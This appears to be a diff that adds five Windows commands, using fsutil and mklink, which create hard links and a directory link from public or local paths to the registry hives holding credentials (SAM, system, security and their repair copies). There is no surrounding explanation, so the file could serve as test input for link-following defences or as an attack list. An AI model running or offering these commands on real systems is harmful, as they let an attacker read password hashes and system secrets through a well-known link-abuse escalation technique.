@@ -1,0 +1,5 @@
+fsutil hardlink create C:\public\test.txt C:\Windows\System32\config\SAM
+mklink /H C:\public\link.txt C:\Windows\system32\config\system
+mklink /H exploit.txt C:\Windows\repair\SAM
+mklink /H out.txt C:\Windows\repair\security
+mklink /D C:\public\shadow C:\Windows\System32\config
